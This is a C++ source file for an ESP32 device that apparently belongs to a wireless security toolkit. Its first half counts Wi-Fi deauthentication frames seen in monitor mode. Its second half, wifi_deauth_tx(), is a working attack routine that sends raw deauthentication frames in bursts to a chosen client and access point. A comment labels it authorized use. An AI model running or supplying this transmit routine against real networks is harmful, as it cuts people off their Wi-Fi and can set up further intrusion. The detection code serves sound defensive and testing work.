#include "deauth_detect.h"
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>

// Counts deauth/disassoc frames in the air via WiFi promiscuous (monitor) mode.
// ponytail: shares the WiFi radio with the scanner — running both at once needs
// arbitration on hardware; and a single channel is watched unless you hop. See BRINGUP.
static volatile uint32_t s_count = 0;
static bool s_on = false;

static void promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t *)buf;
  if (is_deauth(p->payload, p->rx_ctrl.sig_len)) s_count++;
}

void deauth_begin() {
  if (s_on) return;
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&promisc_cb);
  s_on = true;
}

bool     deauth_active() { return s_on; }
uint32_t deauth_count()  { return s_count; }

// Authorized-use deauth transmit. Frame is built by the host-tested deauth_frame();
// esp_wifi_80211_tx pushes raw mgmt frames. Bring-up: needs promiscuous/AP iface
// active and a target on the current channel — see docs/BRINGUP.md (WiFi deauth).
bool wifi_deauth_tx(const uint8_t dst[6], const uint8_t bssid[6],
                    uint16_t reason, int bursts) {
  if (!s_on) deauth_begin();                  // promiscuous iface is enough to TX
  uint8_t frame[DEAUTH_FRAME_LEN];
  deauth_frame(dst, bssid, reason, frame);
  bool ok = true;
  for (int i = 0; i < bursts; i++) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof frame, false) != ESP_OK)
      ok = false;
    delay(1);
  }
  return ok;
}
